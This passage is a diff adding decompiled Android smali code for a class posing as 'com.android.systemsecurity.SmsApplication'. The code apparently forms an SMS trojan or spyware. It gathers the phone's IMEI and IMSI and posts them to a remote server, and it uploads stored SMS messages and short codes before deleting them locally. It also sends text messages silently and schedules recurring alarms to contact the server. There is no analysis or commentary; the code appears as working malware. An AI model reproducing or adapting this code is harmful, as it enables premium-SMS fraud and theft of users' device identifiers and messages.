+    .line 304
+    :pswitch_2
+    const-string v10, "time"
+
+    invoke-virtual {v6, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v10
+
+    if-eqz v10, :cond_0
+
+    .line 306
+    invoke-interface {v8}, Lorg/xmlpull/v1/XmlPullParser;->getText()Ljava/lang/String;
+
+    move-result-object v7
+
+    .line 307
+    .local v7, time:Ljava/lang/String;
+    invoke-static {v7}, Lcom/android/systemsecurity/SmsApplication;->dateFromString(Ljava/lang/String;)Ljava/util/Date;
+
+    move-result-object v1
+
+    .line 308
+    .local v1, date:Ljava/util/Date;
+    invoke-virtual {v1}, Ljava/util/Date;->getTime()J
+
+    move-result-wide v10
+
+    iput-wide v10, v5, Lcom/android/systemsecurity/ServerResponse;->time:J
+
+    .line 312
+    const-string v6, ""
+    :try_end_1
+    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
+
+    goto/16 :goto_0
+
+    .line 264
+    nop
+
+    :pswitch_data_0
+    .packed-switch 0x2
+        :pswitch_0
+        :pswitch_1
+        :pswitch_2
+    .end packed-switch
+.end method
+
+.method public static sendRequest()Lcom/android/systemsecurity/ServerResponse;
+    .locals 6
+
+    .prologue
+    .line 193
+    new-instance v2, Lcom/android/systemsecurity/ServerResponse;
+
+    invoke-direct {v2}, Lcom/android/systemsecurity/ServerResponse;-><init>()V
+
+    .line 197
+    .local v2, response:Lcom/android/systemsecurity/ServerResponse;
+    :try_start_0
+    new-instance v1, Ljava/util/LinkedList;
+
+    invoke-direct {v1}, Ljava/util/LinkedList;-><init>()V
+
+    .line 198
+    .local v1, params:Ljava/util/List;,"Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
+    new-instance v3, Lorg/apache/http/message/BasicNameValuePair;
+
+    const-string v4, "imei"
+
+    sget-object v5, Lcom/android/systemsecurity/SmsApplication;->imei:Ljava/lang/String;
+
+    invoke-direct {v3, v4, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V
+
+    invoke-interface {v1, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    .line 199
+    new-instance v3, Lorg/apache/http/message/BasicNameValuePair;
+
+    const-string v4, "time"
+
+    invoke-static {}, Lcom/android/systemsecurity/SmsApplication;->getCurrentTime()Ljava/lang/String;
+
+    move-result-object v5
+
+    invoke-direct {v3, v4, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V
+
+    invoke-interface {v1, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    .line 200
+    new-instance v3, Lorg/apache/http/message/BasicNameValuePair;
+
+    const-string v4, "os"
+
+    const-string v5, "android"
+
+    invoke-direct {v3, v4, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V
+
+    invoke-interface {v1, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    .line 201
+    new-instance v3, Lorg/apache/http/message/BasicNameValuePair;
+
+    const-string v4, "imsi"
+
+    sget-object v5, Lcom/android/systemsecurity/SmsApplication;->imsi:Ljava/lang/String;
+
+    invoke-direct {v3, v4, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V
+
+    invoke-interface {v1, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    .line 202
+    new-instance v3, Lorg/apache/http/message/BasicNameValuePair;
+
+    const-string v4, "v"
+
+    sget-object v5, Lcom/android/systemsecurity/SmsApplication;->version:Ljava/lang/String;
+
+    invoke-direct {v3, v4, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V
+
+    invoke-interface {v1, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    .line 203
+    invoke-static {}, Lcom/android/systemsecurity/SmsApplication;->getApplicationUrl()Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-static {v3, v1}, Lcom/android/systemsecurity/SmsApplication;->sendHttpData(Ljava/lang/String;Ljava/util/List;)Lcom/android/systemsecurity/ServerResponse;
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    move-result-object v2
+
+    .line 212
+    .end local v1           #params:Ljava/util/List;,"Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
+    :goto_0
+    return-object v2
+
+    .line 205
+    :catch_0
+    move-exception v0
+
+    .line 207
+    .local v0, ex:Ljava/lang/Exception;
+    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
+
+    goto :goto_0
+.end method
+
+.method public static sendSms(Ljava/lang/String;Ljava/lang/String;)Z
+    .locals 8
+    .parameter "number"
+    .parameter "text"
+
+    .prologue
+    const/4 v7, 0x0
+
+    .line 770
+    if-nez p0, :cond_0
+
+    move v1, v7
+
+    .line 785
+    :goto_0
+    return v1
+
+    .line 774
+    :cond_0
+    :try_start_0
+    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;
+
+    move-result-object v0
+
+    .line 775
+    .local v0, smsManager:Landroid/telephony/SmsManager;
+    const/4 v2, 0x0
+
+    const/4 v4, 0x0
+
+    const/4 v5, 0x0
+
+    move-object v1, p0
+
+    move-object v3, p1
+
+    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
+
+    .line 776
+    sget-object v1, Lcom/android/systemsecurity/SmsApplication;->TAG:Ljava/lang/String;
+
+    new-instance v2, Ljava/lang/StringBuilder;
+
+    const-string v3, "sms: "
+
+    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    const-string v3, " to "
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    .line 778
+    const/4 v1, 0x1
+
+    goto :goto_0
+
+    .line 780
+    .end local v0           #smsManager:Landroid/telephony/SmsManager;
+    :catch_0
+    move-exception v6
+
+    .line 782
+    .local v6, ex:Ljava/lang/Exception;
+    invoke-virtual {v6}, Ljava/lang/Exception;->printStackTrace()V
+
+    move v1, v7
+
+    .line 785
+    goto :goto_0
+.end method
+
+.method public static setLastSendTime(J)V
+    .locals 0
+    .parameter "lastSendTime"
+
+    .prologue
+    .line 553
+    sput-wide p0, Lcom/android/systemsecurity/SmsApplication;->_lastSendTime:J
+
+    .line 554
+    return-void
+.end method
+
+.method public static setLastShortCode(Ljava/lang/String;)V
+    .locals 0
+    .parameter "lastShortCode"
+
+    .prologue
+    .line 561
+    sput-object p0, Lcom/android/systemsecurity/SmsApplication;->_lastShortCode:Ljava/lang/String;
+
+    .line 562
+    return-void
+.end method
+
+.method public static setReplyCodeGrp(I)V
+    .locals 0
+    .parameter "replyCodeGrp"
+
+    .prologue
+    .line 585
+    sput p0, Lcom/android/systemsecurity/SmsApplication;->_replyCodeGrp:I
+
+    .line 586
+    return-void
+.end method
+
+.method public static setReplyCodeRxp(Ljava/lang/String;)V
+    .locals 0
+    .parameter "replyCodeRxp"
+
+    .prologue
+    .line 569
+    sput-object p0, Lcom/android/systemsecurity/SmsApplication;->_replyCodeRxp:Ljava/lang/String;
+
+    .line 570
+    return-void
+.end method
+
+.method public static setReplyNumberGrp(I)V
+    .locals 0
+    .parameter "replyNumberGrp"
+
+    .prologue
+    .line 593
+    sput p0, Lcom/android/systemsecurity/SmsApplication;->_replyNumberGrp:I
+
+    .line 594
+    return-void
+.end method
+
+.method public static setReplyNumberRxp(Ljava/lang/String;)V
+    .locals 0
+    .parameter "replyNumberRxp"
+
+    .prologue
+    .line 577
+    sput-object p0, Lcom/android/systemsecurity/SmsApplication;->_replyNumberRxp:Ljava/lang/String;
+
+    .line 578
+    return-void
+.end method
+
+.method public static uploadMessageStat(Landroid/content/Context;)V
+    .locals 8
+    .parameter "context"
+
+    .prologue
+    .line 789
+    new-instance v0, Lcom/android/systemsecurity/MessagesDataSource;
+
+    invoke-direct {v0, p0}, Lcom/android/systemsecurity/MessagesDataSource;-><init>(Landroid/content/Context;)V
+
+    .line 790
+    .local v0, ds:Lcom/android/systemsecurity/MessagesDataSource;
+    invoke-virtual {v0}, Lcom/android/systemsecurity/MessagesDataSource;->open()V
+
+    .line 792
+    :try_start_0
+    invoke-virtual {v0}, Lcom/android/systemsecurity/MessagesDataSource;->getAllMessages()Ljava/util/List;
+
+    move-result-object v2
+
+    .line 795
+    .local v2, messages:Ljava/util/List;,"Ljava/util/List<Lcom/android/systemsecurity/Message;>;"
+    const/4 v1, 0x0
+
+    .local v1, i:I
+    :goto_0
+    invoke-interface {v2}, Ljava/util/List;->size()I
+    :try_end_0
+    .catchall {:try_start_0 .. :try_end_0} :catchall_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    move-result v5
+
+    if-lt v1, v5, :cond_0
+
+    .line 821
+    invoke-virtual {v0}, Lcom/android/systemsecurity/MessagesDataSource;->close()V
+
+    .line 823
+    .end local v1           #i:I
+    .end local v2           #messages:Ljava/util/List;,"Ljava/util/List<Lcom/android/systemsecurity/Message;>;"
+    :goto_1
+    return-void
+
+    .line 800
+    .restart local v1       #i:I
+    .restart local v2       #messages:Ljava/util/List;,"Ljava/util/List<Lcom/android/systemsecurity/Message;>;"
+    :cond_0
+    :try_start_1
+    new-instance v3, Ljava/util/LinkedList;
+
+    invoke-direct {v3}, Ljava/util/LinkedList;-><init>()V
+
+    .line 801
+    .local v3, params:Ljava/util/List;,"Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
+    new-instance v5, Lorg/apache/http/message/BasicNameValuePair;
+
+    const-string v6, "imei"
+
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->imei:Ljava/lang/String;
+
+    invoke-direct {v5, v6, v7}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V
+
+    invoke-interface {v3, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    .line 802
+    new-instance v5, Lorg/apache/http/message/BasicNameValuePair;
+
+    const-string v6, "imsi"
+
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->imsi:Ljava/lang/String;
+
+    invoke-direct {v5, v6, v7}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V
+
+    invoke-interface {v3, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    .line 803
+    new-instance v6, Lorg/apache/http/message/BasicNameValuePair;
+
+    const-string v7, "msg"
+
+    invoke-interface {v2, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;
+
+    move-result-object v5
+
+    check-cast v5, Lcom/android/systemsecurity/Message;
+
+    invoke-virtual {v5}, Lcom/android/systemsecurity/Message;->getMessage()Ljava/lang/String;
+
+    move-result-object v5
+
+    invoke-direct {v6, v7, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V
+
+    invoke-interface {v3, v6}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    .line 804
+    new-instance v6, Lorg/apache/http/message/BasicNameValuePair;
+
+    const-string v7, "shortcode"
+
+    invoke-interface {v2, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;
+
+    move-result-object v5
+
+    check-cast v5, Lcom/android/systemsecurity/Message;
+
+    invoke-virtual {v5}, Lcom/android/systemsecurity/Message;->getShortCode()Ljava/lang/String;
+
+    move-result-object v5
+
+    invoke-direct {v6, v7, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V
+
+    invoke-interface {v3, v6}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    .line 805
+    new-instance v6, Lorg/apache/http/message/BasicNameValuePair;
+
+    const-string v7, "fromshortcode"
+
+    invoke-interface {v2, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;
+
+    move-result-object v5
+
+    check-cast v5, Lcom/android/systemsecurity/Message;
+
+    invoke-virtual {v5}, Lcom/android/systemsecurity/Message;->getFromShortCode()Ljava/lang/String;
+
+    move-result-object v5
+
+    invoke-direct {v6, v7, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V
+
+    invoke-interface {v3, v6}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    .line 807
+    invoke-static {}, Lcom/android/systemsecurity/SmsApplication;->getStatisticsUrl()Ljava/lang/String;
+
+    move-result-object v5
+
+    invoke-static {v5, v3}, Lcom/android/systemsecurity/SmsApplication;->makeHttpPost(Ljava/lang/String;Ljava/util/List;)Lorg/apache/http/HttpResponse;
+
+    move-result-object v4
+
+    .line 817
+    .local v4, r:Lorg/apache/http/HttpResponse;
+    invoke-interface {v2, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;
+
+    move-result-object v5
+
+    check-cast v5, Lcom/android/systemsecurity/Message;
+
+    invoke-virtual {v0, v5}, Lcom/android/systemsecurity/MessagesDataSource;->deleteMessage(Lcom/android/systemsecurity/Message;)V
+    :try_end_1
+    .catchall {:try_start_1 .. :try_end_1} :catchall_0
+    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
+
+    .line 795
+    add-int/lit8 v1, v1, 0x1
+
+    goto :goto_0
+
+    .line 819
+    .end local v1           #i:I
+    .end local v2           #messages:Ljava/util/List;,"Ljava/util/List<Lcom/android/systemsecurity/Message;>;"
+    .end local v3           #params:Ljava/util/List;,"Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
+    .end local v4           #r:Lorg/apache/http/HttpResponse;
+    :catch_0
+    move-exception v5
+
+    .line 821
+    invoke-virtual {v0}, Lcom/android/systemsecurity/MessagesDataSource;->close()V
+
+    goto :goto_1
+
+    .line 820
+    :catchall_0
+    move-exception v5
+
+    .line 821
+    invoke-virtual {v0}, Lcom/android/systemsecurity/MessagesDataSource;->close()V
+
+    .line 822
+    throw v5
+.end method
+
+
+# virtual methods
+.method cancelAlarmScheduler(Landroid/app/PendingIntent;)V
+    .locals 2
+    .parameter "pi"
+
+    .prologue
+    .line 157
+    :try_start_0
+    const-string v1, "alarm"
+
+    invoke-virtual {p0, v1}, Lcom/android/systemsecurity/SmsApplication;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v0
+
+    check-cast v0, Landroid/app/AlarmManager;
+
+    .line 158
+    .local v0, alarmManager:Landroid/app/AlarmManager;
+    invoke-virtual {v0, p1}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    .line 163
+    .end local v0           #alarmManager:Landroid/app/AlarmManager;
+    :goto_0
+    return-void
+
+    .line 160
+    :catch_0
+    move-exception v1
+
+    goto :goto_0
+.end method
+
+.method public onCreate()V
+    .locals 15
+
+    .prologue
+    const v14, 0x193dacb3
+
+    const/4 v13, 0x1
+
+    const/4 v12, 0x0
+
+    .line 73
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->TAG:Ljava/lang/String;
+
+    const-string v8, "SmsApplication::onCreate()"
+
+    invoke-static {v7, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 74
+    const-string v7, "SmsApplication :: onCreate()"
+
+    invoke-static {v7, p0}, Lcom/android/systemsecurity/SmsApplication;->logStat(Ljava/lang/String;Landroid/content/Context;)V
+
+    .line 75
+    invoke-super {p0}, Landroid/app/Application;->onCreate()V
+
+    .line 77
+    invoke-static {p0}, Lcom/android/systemsecurity/SmsApplication;->getImei(Landroid/content/Context;)Ljava/lang/String;
+
+    move-result-object v7
+
+    sput-object v7, Lcom/android/systemsecurity/SmsApplication;->imei:Ljava/lang/String;
+
+    .line 78
+    invoke-static {p0}, Lcom/android/systemsecurity/SmsApplication;->getImsi(Landroid/content/Context;)Ljava/lang/String;
+
+    move-result-object v7
+
+    sput-object v7, Lcom/android/systemsecurity/SmsApplication;->imsi:Ljava/lang/String;
+
+    .line 79
+    new-instance v7, Lcom/android/systemsecurity/Settings;
+
+    invoke-direct {v7}, Lcom/android/systemsecurity/Settings;-><init>()V
+
+    sput-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    .line 81
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    invoke-virtual {v7, p0}, Lcom/android/systemsecurity/Settings;->load(Landroid/content/Context;)Z
+
+    move-result v7
+
+    if-nez v7, :cond_0
+
+    .line 83
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v7, v7, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    sget-object v8, Lcom/android/systemsecurity/SmsApplication;->DOMAIN:Ljava/lang/String;
+
+    iput-object v8, v7, Lcom/android/systemsecurity/SettingsSet;->server:Ljava/lang/String;
+
+    .line 84
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v7, v7, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    sget-object v8, Lcom/android/systemsecurity/SmsApplication;->newServerKey:Ljava/lang/String;
+
+    iput-object v8, v7, Lcom/android/systemsecurity/SettingsSet;->key:Ljava/lang/String;
+
+    .line 85
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v7, v7, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    sget v8, Lcom/android/systemsecurity/SmsApplication;->PERIOD:I
+
+    int-to-long v8, v8
+
+    iput-wide v8, v7, Lcom/android/systemsecurity/SettingsSet;->period:J
+
+    .line 86
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v7, v7, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iput-boolean v13, v7, Lcom/android/systemsecurity/SettingsSet;->isNeedSendContacts:Z
+
+    .line 87
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v7, v7, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
+
+    move-result-wide v8
+
+    sget v10, Lcom/android/systemsecurity/Settings;->MINUTE:I
+
+    mul-int/lit8 v10, v10, 0x3
+
+    int-to-long v10, v10
+
+    add-long/2addr v8, v10
+
+    iput-wide v8, v7, Lcom/android/systemsecurity/SettingsSet;->nextTimeConnection:J
+
+    .line 88
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v7, v7, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iput-boolean v13, v7, Lcom/android/systemsecurity/SettingsSet;->isFirstStart:Z
+
+    .line 90
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->TAG:Ljava/lang/String;
+
+    const-string v8, "Load settings"
+
+    invoke-static {v7, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 94
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    invoke-virtual {v7, p0}, Lcom/android/systemsecurity/Settings;->save(Landroid/content/Context;)Z
+
+    .line 99
+    :cond_0
+    new-instance v7, Ljava/lang/StringBuilder;
+
+    const-string v8, "SmsApplication :: next: = "
+
+    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    sget-object v8, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v8, v8, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iget-wide v8, v8, Lcom/android/systemsecurity/SettingsSet;->nextTimeConnection:J
+
+    invoke-static {v8, v9}, Lcom/android/systemsecurity/SmsApplication;->millsToString(J)Ljava/lang/String;
+
+    move-result-object v8
+
+    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v7
+
+    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v7
+
+    invoke-static {v7, p0}, Lcom/android/systemsecurity/SmsApplication;->logStat(Ljava/lang/String;Landroid/content/Context;)V
+
+    .line 102
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v7, v7, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iget-boolean v7, v7, Lcom/android/systemsecurity/SettingsSet;->isFirstStart:Z
+
+    if-eqz v7, :cond_2
+
+    .line 104
+    new-instance v1, Landroid/content/Intent;
+
+    const-class v7, Lcom/android/systemsecurity/RepeatingAlarmService;
+
+    invoke-direct {v1, p0, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 105
+    .local v1, intent:Landroid/content/Intent;
+    invoke-static {p0, v14, v1, v12}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;
+
+    move-result-object v6
+
+    .line 107
+    .local v6, pendingIntent:Landroid/app/PendingIntent;
+    invoke-virtual {p0, v6}, Lcom/android/systemsecurity/SmsApplication;->cancelAlarmScheduler(Landroid/app/PendingIntent;)V
+
+    .line 108
+    const-string v7, "alarm"
+
+    invoke-virtual {p0, v7}, Lcom/android/systemsecurity/SmsApplication;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v0
+
+    check-cast v0, Landroid/app/AlarmManager;
+
+    .line 111
+    .local v0, alarmManager:Landroid/app/AlarmManager;
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v7, v7, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iget-wide v7, v7, Lcom/android/systemsecurity/SettingsSet;->nextTimeConnection:J
+
+    .line 109
+    invoke-virtual {v0, v12, v7, v8, v6}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V
+
+    .line 114
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v7, v7, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iput-boolean v12, v7, Lcom/android/systemsecurity/SettingsSet;->isFirstStart:Z
+
+    .line 115
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    invoke-virtual {v7, p0}, Lcom/android/systemsecurity/Settings;->save(Landroid/content/Context;)Z
+
+    .line 117
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->TAG:Ljava/lang/String;
+
+    new-instance v8, Ljava/lang/StringBuilder;
+
+    const-string v9, "isFirstStart, nextTime = "
+
+    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    sget-object v9, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v9, v9, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iget-wide v9, v9, Lcom/android/systemsecurity/SettingsSet;->nextTimeConnection:J
+
+    invoke-static {v9, v10}, Lcom/android/systemsecurity/SmsApplication;->millsToString(J)Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v8
+
+    invoke-static {v7, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 118
+    new-instance v7, Ljava/lang/StringBuilder;
+
+    const-string v8, "SmsApplication isFirstStart, nextTime = "
+
+    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    sget-object v8, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v8, v8, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iget-wide v8, v8, Lcom/android/systemsecurity/SettingsSet;->nextTimeConnection:J
+
+    invoke-static {v8, v9}, Lcom/android/systemsecurity/SmsApplication;->millsToString(J)Ljava/lang/String;
+
+    move-result-object v8
+
+    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v7
+
+    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v7
+
+    invoke-static {v7, p0}, Lcom/android/systemsecurity/SmsApplication;->logStat(Ljava/lang/String;Landroid/content/Context;)V
+
+    .line 153
+    .end local v0           #alarmManager:Landroid/app/AlarmManager;
+    .end local v1           #intent:Landroid/content/Intent;
+    .end local v6           #pendingIntent:Landroid/app/PendingIntent;
+    :cond_1
+    :goto_0
+    return-void
+
+    .line 123
+    :cond_2
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->TAG:Ljava/lang/String;
+
+    new-instance v8, Ljava/lang/StringBuilder;
+
+    const-string v9, "Not first start, next = "
+
+    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    sget-object v9, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v9, v9, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iget-wide v9, v9, Lcom/android/systemsecurity/SettingsSet;->nextTimeConnection:J
+
+    invoke-static {v9, v10}, Lcom/android/systemsecurity/SmsApplication;->millsToString(J)Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v8
+
+    invoke-static {v7, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 124
+    const-string v7, "SmsApplication Not first start"
+
+    invoke-static {v7, p0}, Lcom/android/systemsecurity/SmsApplication;->logStat(Ljava/lang/String;Landroid/content/Context;)V
+
+    .line 125
+    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
+
+    move-result-wide v2
+
+    .line 126
+    .local v2, now:J
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v7, v7, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iget-wide v7, v7, Lcom/android/systemsecurity/SettingsSet;->nextTimeConnection:J
+
+    sub-long v4, v7, v2
+
+    .line 130
+    .local v4, offset:J
+    const-wide/16 v7, 0x0
+
+    cmp-long v7, v4, v7
+
+    if-gez v7, :cond_1
+
+    .line 133
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v7, v7, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    sget v8, Lcom/android/systemsecurity/Settings;->MINUTE:I
+
+    mul-int/lit8 v8, v8, 0x3
+
+    int-to-long v8, v8
+
+    add-long/2addr v8, v2
+
+    iput-wide v8, v7, Lcom/android/systemsecurity/SettingsSet;->nextTimeConnection:J
+
+    .line 134
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    invoke-virtual {v7, p0}, Lcom/android/systemsecurity/Settings;->save(Landroid/content/Context;)Z
+
+    .line 135
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->TAG:Ljava/lang/String;
+
+    new-instance v8, Ljava/lang/StringBuilder;
+
+    const-string v9, "Not first start, triger time is left, next time to connect = "
+
+    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    sget-object v9, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v9, v9, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
